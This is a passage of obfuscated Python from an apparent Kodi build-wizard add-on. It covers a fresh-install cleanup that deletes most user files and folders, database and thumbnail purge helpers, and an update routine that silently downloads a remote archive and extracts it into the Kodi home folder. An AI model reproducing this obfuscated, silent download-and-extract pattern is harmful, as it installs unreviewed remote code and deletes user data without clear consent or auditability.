				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'plugin.video.metalliq'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4922
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'skin.titan'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4924
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'pvr.iptvsimple'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4925
				elif OO000O000000O00OO =='sources.xml'and O00O0OOOO000O0O00 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4927
				elif OO000O000000O00OO =='quicknav.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4930
				elif OO000O000000O00OO =='x1101.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4931
				elif OO000O000000O00OO =='b-srtym-b.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4932
				elif OO000O000000O00OO =='x1102.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4933
				elif OO000O000000O00OO =='b-sdrvt-b.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4934
				elif OO000O000000O00OO =='x1112.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4935
				elif OO000O000000O00OO =='b-tlvvyzyh-b.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4936
				elif OO000O000000O00OO =='x1111.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4937
				elif OO000O000000O00OO =='b-tvknyshrly-b.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4938
				elif OO000O000000O00OO =='x1110.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4939
				elif OO000O000000O00OO =='b-yldym-b.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4940
				elif OO000O000000O00OO =='x1114.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4941
				elif OO000O000000O00OO =='b-mvzyqh-b.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4942
				elif OO000O000000O00OO =='mainmenu.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4943
				elif OO000O000000O00OO =='skin.Premium.mod.properties'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4944
				elif OO000O000000O00OO =='x1122.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4946
				elif OO000O000000O00OO =='b-spvrt-b.DATA.xml'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4947
				elif OO000O000000O00OO =='favourites.xml'and O00O0OOOO000O0O00 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4952
				elif OO000O000000O00OO =='guisettings.xml'and O00O0OOOO000O0O00 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4954
				elif OO000O000000O00OO =='profiles.xml'and O00O0OOOO000O0O00 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4955
				elif OO000O000000O00OO =='advancedsettings.xml'and O00O0OOOO000O0O00 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4956
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4957
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'program.apollo'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4958
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4959
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'plugin.video.telemedia'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4960
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'plugin.video.elementum'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4963
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4965
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'weather.yahoo'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4966
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'plugin.video.quasar'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4967
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'program.apollo'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4968
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4969
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4970
				elif OO000O000000O00OO in LOGFILES :wiz .log ("Keep Log File: %s"%OO000O000000O00OO ,xbmc .LOGNOTICE )#line:4971
				elif OO000O000000O00OO .endswith ('.db'):#line:4972
					try :#line:4973
						if OO000O000000O00OO ==OOO0O0O0OOO0O00OO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OO000O000000O00OO ,KODIV ),xbmc .LOGNOTICE )#line:4974
						else :os .remove (os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ))#line:4975
					except Exception as OO000OOO00O00OO0O :#line:4976
						if not OO000O000000O00OO .startswith ('Textures13'):#line:4977
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4978
							wiz .log ("-> %s"%(str (OO000OOO00O00OO0O )),xbmc .LOGNOTICE )#line:4979
							wiz .purgeDb (os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ))#line:4980
				else :#line:4981
					DP .update (int (wiz .percentage (O0O00OOOO0OO0OO00 ,OO0000O0OOOOOOOO0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O000000O00OO ),'')#line:4982
					try :os .remove (os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ))#line:4983
					except Exception as OO000OOO00O00OO0O :#line:4984
						wiz .log ("Error removing %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4985
						wiz .log ("-> / %s"%(str (OO000OOO00O00OO0O )),xbmc .LOGNOTICE )#line:4986
			if DP .iscanceled ():#line:4987
				DP .close ()#line:4988
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4989
				return False #line:4990
		for O00000O00OO0OO000 ,OOO0OOOOOOOO00000 ,O00O00OOOO0O0000O in os .walk (OOOO00O0O00O000OO ,topdown =True ):#line:4991
			OOO0OOOOOOOO00000 [:]=[OOOO000OOO0O0OO00 for OOOO000OOO0O0OO00 in OOO0OOOOOOOO00000 if OOOO000OOO0O0OO00 not in EXCLUDES ]#line:4992
			for OO000O000000O00OO in OOO0OOOOOOOO00000 :#line:4993
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO000O000000O00OO ),'')#line:4994
			  if OO000O000000O00OO not in ["Database","userdata","temp","addons","addon_data"]:#line:4995
			   if not (OO000O000000O00OO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4996
			    if not (OO000O000000O00OO =='skin.titan'and KEEPSKIN3 =='true'):#line:4998
			      if not (OO000O000000O00OO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4999
			       if not (OO000O000000O00OO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5000
			        if not (OO000O000000O00OO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5001
			         if not (OO000O000000O00OO =='program.apollo'and KEEPINFO =='true'):#line:5002
			          if not (OO000O000000O00OO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5003
			           if not (OO000O000000O00OO =='weather.yahoo'and KEEPWEATHER =='true'):#line:5004
			            if not (OO000O000000O00OO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5005
			             if not (OO000O000000O00OO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5006
			              if not (OO000O000000O00OO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5007
			               if not (OO000O000000O00OO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5008
			                if not (OO000O000000O00OO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5009
			                 if not (OO000O000000O00OO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5010
			                  if not (OO000O000000O00OO =='plugin.video.neptune'and KEEPINFO =='true'):#line:5011
			                   if not (OO000O000000O00OO =='plugin.video.youtube'and KEEPINFO =='true'):#line:5012
			                    if not (OO000O000000O00OO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5013
			                     if not (OO000O000000O00OO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5014
			                      if not (OO000O000000O00OO =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5015
			                       if not (OO000O000000O00OO =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5016
			                           if not (OO000O000000O00OO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5020
			                            if not (OO000O000000O00OO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5021
			                             if not (OO000O000000O00OO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5022
			                              if not (OO000O000000O00OO =='plugin.video.quasar'and KEEPINFO =='true'):#line:5023
			                               if not (OO000O000000O00OO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5024
			                                  shutil .rmtree (os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),ignore_errors =True ,onerror =None )#line:5026
			if DP .iscanceled ():#line:5027
				DP .close ()#line:5028
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5029
				return False #line:5030
		DP .close ()#line:5031
		wiz .clearS ('build')#line:5032
		if over ==True :#line:5033
			return True #line:5034
		elif install =='restore':#line:5035
			return True #line:5036
		elif install :#line:5037
			buildWizard (install ,'normal',over =True )#line:5038
		else :#line:5039
			if INSTALLMETHOD ==1 :O0O0O0O0OOOO0O0O0 =1 #line:5040
			elif INSTALLMETHOD ==2 :O0O0O0O0OOOO0O0O0 =0 #line:5041
			else :O0O0O0O0OOOO0O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5042
			if O0O0O0O0OOOO0O0O0 ==1 :wiz .reloadFix ('fresh')#line:5043
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5044
	else :#line:5045
		if not install =='restore':#line:5046
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5047
			wiz .refresh ()#line:5048
def clearCache ():#line:5053
		wiz .clearCache ()#line:5054
def fixwizard ():#line:5058
		wiz .fixwizard ()#line:5059
def totalClean ():#line:5061
		wiz .clearCache ()#line:5063
		wiz .clearPackages ('total')#line:5064
		clearThumb ('total')#line:5065
		cleanfornewbuild ()#line:5066
def cleanfornewbuild ():#line:5067
		try :#line:5068
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5069
		except :#line:5070
			pass #line:5071
		try :#line:5072
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5073
		except :#line:5074
			pass #line:5075
		try :#line:5076
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5077
		except :#line:5078
			pass #line:5079
def clearThumb (type =None ):#line:5080
	O0000000OOO000O0O =wiz .latestDB ('Textures')#line:5081
	if not type ==None :O00OO0OO0OOOO0O00 =1 #line:5082
	else :O00OO0OO0OOOO0O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0000000OOO000O0O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5083
	if O00OO0OO0OOOO0O00 ==1 :#line:5084
		try :wiz .removeFile (os .join (DATABASE ,O0000000OOO000O0O ))#line:5085
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0000000OOO000O0O )#line:5086
		wiz .removeFolder (THUMBS )#line:5087
	else :wiz .log ('Clear thumbnames cancelled')#line:5089
	wiz .redoThumbs ()#line:5090
def purgeDb ():#line:5092
	OO0O0O0O00OOOOOOO =[];OOOO0O0O0000O0000 =[]#line:5093
	for OO0O0O00OO00000OO ,O00O0OOOO0OO0OO00 ,OO0O00O000OOOOO0O in os .walk (HOME ):#line:5094
		for OO0OOOOOO0O000000 in fnmatch .filter (OO0O00O000OOOOO0O ,'*.db'):#line:5095
			if OO0OOOOOO0O000000 !='Thumbs.db':#line:5096
				O0000OOOOO00OO0OO =os .path .join (OO0O0O00OO00000OO ,OO0OOOOOO0O000000 )#line:5097
				OO0O0O0O00OOOOOOO .append (O0000OOOOO00OO0OO )#line:5098
				O000000OO000O0O0O =O0000OOOOO00OO0OO .replace ('\\','/').split ('/')#line:5099
				OOOO0O0O0000O0000 .append ('(%s) %s'%(O000000OO000O0O0O [len (O000000OO000O0O0O )-2 ],O000000OO000O0O0O [len (O000000OO000O0O0O )-1 ]))#line:5100
	if KODIV >=16 :#line:5101
		O0O0O000O0OOOOOOO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOO0O0O0000O0000 )#line:5102
		if O0O0O000O0OOOOOOO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5103
		elif len (O0O0O000O0OOOOOOO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5104
		else :#line:5105
			for O000O0OO00O0OOOO0 in O0O0O000O0OOOOOOO :wiz .purgeDb (OO0O0O0O00OOOOOOO [O000O0OO00O0OOOO0 ])#line:5106
	else :#line:5107
		O0O0O000O0OOOOOOO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOO0O0O0000O0000 )#line:5108
		if O0O0O000O0OOOOOOO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5109
		else :wiz .purgeDb (OO0O0O0O00OOOOOOO [O000O0OO00O0OOOO0 ])#line:5110
def fastupdatefirstbuild (OOOOOO0OO0O00OO00 ):#line:5116
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5118
	if ENABLE =='Yes':#line:5119
		if not NOTIFY =='true':#line:5120
			OO0O00000O0OOO0OO =wiz .workingURL (NOTIFICATION )#line:5121
			if OO0O00000O0OOO0OO ==True :#line:5122
				OO00000O00OOO0OOO ,O0OO0O000000O0O0O =wiz .splitNotify (NOTIFICATION )#line:5123
				if not OO00000O00OOO0OOO ==False :#line:5125
					try :#line:5126
						OO00000O00OOO0OOO =int (OO00000O00OOO0OOO );OOOOOO0OO0O00OO00 =int (OOOOOO0OO0O00OO00 )#line:5127
						checkidupdate ()#line:5128
						wiz .setS ("notedismiss","true")#line:5129
						if OO00000O00OOO0OOO ==OOOOOO0OO0O00OO00 :#line:5130
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO00000O00OOO0OOO ),xbmc .LOGNOTICE )#line:5131
						elif OO00000O00OOO0OOO >OOOOOO0OO0O00OO00 :#line:5133
							wiz .log ("[Notifications] id: %s"%str (OO00000O00OOO0OOO ),xbmc .LOGNOTICE )#line:5134
							wiz .setS ('noteid',str (OO00000O00OOO0OOO ))#line:5135
							wiz .setS ("notedismiss","true")#line:5136
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5139
					except Exception as O0O0OO0O00O00000O :#line:5140
						wiz .log ("Error on Notifications Window: %s"%str (O0O0OO0O00O00000O ),xbmc .LOGERROR )#line:5141
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5143
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO0O00000O0OOO0OO ),xbmc .LOGNOTICE )#line:5144
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5145
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5146
def checkidupdate ():#line:5152
				wiz .setS ("notedismiss","true")#line:5154
				O0OO0O0000O000OOO =wiz .workingURL (NOTIFICATION )#line:5155
				O0OOO000OOO000O0O =" Kodi Premium"#line:5157
				O00O0OOOO00000000 =wiz .checkBuild (O0OOO000OOO000O0O ,'gui')#line:5158
				O00O00O000OO00000 =O0OOO000OOO000O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5159
				if not wiz .workingURL (O00O0OOOO00000000 )==True :return #line:5160
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5161
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OOO000OOO000O0O ),'','אנא המתן')#line:5162
				O000O00O000O0O00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O00O000OO00000 )#line:5163
				try :os .remove (O000O00O000O0O00O )#line:5164
				except :pass #line:5165
				logging .warning (O00O0OOOO00000000 )#line:5166
				if 'google'in O00O0OOOO00000000 :#line:5167
				   OO00OO0O0O00O0000 =googledrive_download (O00O0OOOO00000000 ,O000O00O000O0O00O ,DP ,wiz .checkBuild (O0OOO000OOO000O0O ,'filesize'))#line:5168
				else :#line:5171
				  downloader .download (O00O0OOOO00000000 ,O000O00O000O0O00O ,DP )#line:5172
				xbmc .sleep (100 )#line:5173
				O00OOO0OOOOO00OOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO000OOO000O0O )#line:5174
				DP .update (0 ,O00OOO0OOOOO00OOO ,'','אנא המתן')#line:5175
				extract .all (O000O00O000O0O00O ,HOME ,DP ,title =O00OOO0OOOOO00OOO )#line:5176
